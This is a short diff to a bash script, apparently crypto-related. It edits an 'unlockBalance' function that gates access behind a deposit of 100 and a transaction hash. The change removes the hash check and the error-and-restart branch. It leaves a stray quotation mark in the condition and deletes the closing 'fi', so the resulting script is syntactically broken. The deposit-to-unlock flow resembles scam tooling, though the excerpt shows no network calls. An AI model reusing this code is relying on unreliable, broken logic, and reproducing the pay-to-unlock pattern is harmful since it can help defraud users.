@@ -47,16 +47,9 @@ function unlockBalance {
     done
     echo " "
 
-    if [[ $depositAmount -eq 100 && $transactionHash == "$hash_id" ]]; then
+    if [[ $depositAmount -eq 100" ]]; then
         refresh
         selectNetwork
-    else
-        echo -e "\e[31mError: Invalid deposit amount or transaction hash ID. Restarting...\e[0m"
-        sleep 3
-        clear
-        fancyBoxEcho "$welcome_message"
-        unlockBalance
-    fi
 }
 
 function selectNetwork {
